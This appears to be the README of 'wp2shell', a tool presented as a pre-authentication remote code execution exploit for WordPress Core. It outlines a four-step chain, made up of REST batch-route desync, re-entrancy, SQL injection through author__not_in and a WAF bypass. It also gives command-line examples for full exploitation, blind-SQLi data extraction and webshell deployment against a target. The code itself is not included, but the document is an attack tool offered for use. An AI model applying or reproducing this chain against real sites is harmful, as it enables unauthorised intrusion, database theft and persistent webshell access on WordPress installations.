# wp2shell

Pre-authentication RCE exploit for WordPress Core REST API (CVE-2026-63030 | CVSS 9.8).

```
                 ____      _          _ _
 __      ___ __ |___ \ ___| |__   ___| | |
 \ \ /\ / / '_ \  __) / __| '_ \ / _ \ | |
  \ V  V /| |_) |/ __/\__ \ | | |  __/ | |
   \_/\_/ | .__/|_____|___/_| |_|\___|_|_|
          |_|   CVE-2026-63030
```

## Overview

HTTP/HTTPS wp2shell PoC with advanced capabilities for impact demonstration on improperly configured WordPress sites.

**Affected versions:** WordPress Core 6.9.0 - 6.9.4, 7.0.0 - 7.0.1

**Exploit chain:**
1. Batch-route desync via `$validation`/`$matches` index misalignment
2. Re-entrancy through nested batch dispatch (no `is_dispatching()` guard)
3. SQL injection via unsanitized `author__not_in` string bypass in `WP_Query`
4. Optional CloudFront WAF bypass using `GET + _method=POST` with PHP array params

## Usage

```
python wp2shell.py <target> <mode> [options]
```

### Modes

| Flag | Description |
|------|-------------|
| `--check` | Non-destructive vulnerability probe only |
| `--exploit` | Full pre-auth RCE chain |
| `--shell` | Deploy shell with known admin creds |
| `--cleanup` | Remove deployed webshell |
| `--extract SQL` | Extract data via blind SQLi |

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `--proxy PROXY` | HTTP proxy (e.g. `http://127.0.0.1:8080`) | None |
| `--timeout TIMEOUT` | HTTP timeout in seconds | `30` |
| `--table-prefix PREFIX` | WordPress table prefix | `wp_` |
| `--webroot PATH` | Server webroot for OUTFILE | `/var/www/html` |
| `--shell-key KEY` | Webshell auth key | Random |
| `--admin-user USER` | Admin username (for `--shell`/`--cleanup`) | None |
| `--admin-pass PASS` | Admin password (for `--shell`/`--cleanup`) | None |
| `--skip-outfile` | Skip SELECT INTO OUTFILE attempt | Off |
| `--sleep DURATION` | SLEEP duration for blind SQLi | `0.15` |
| `-v, --verbose` | Verbose output | Off |

## Examples

```bash
# Check if target is vulnerable (non-destructive)
python wp2shell.py https://target.com --check

# Full exploit chain
python wp2shell.py https://target.com --exploit -v

# Extract arbitrary data via blind SQLi
python wp2shell.py https://target.com --extract "SELECT user_login FROM wp_users LIMIT 1"

# Deploy shell with known creds
python wp2shell.py https://target.com --shell --admin-user admin --admin-pass password123

# Cleanup
python wp2shell.py https://target.com --cleanup --admin-user admin --admin-pass password123 --shell-key <key>
```
## Requirements

- Python 3.8+
- `requests`

```bash
pip install requests
```
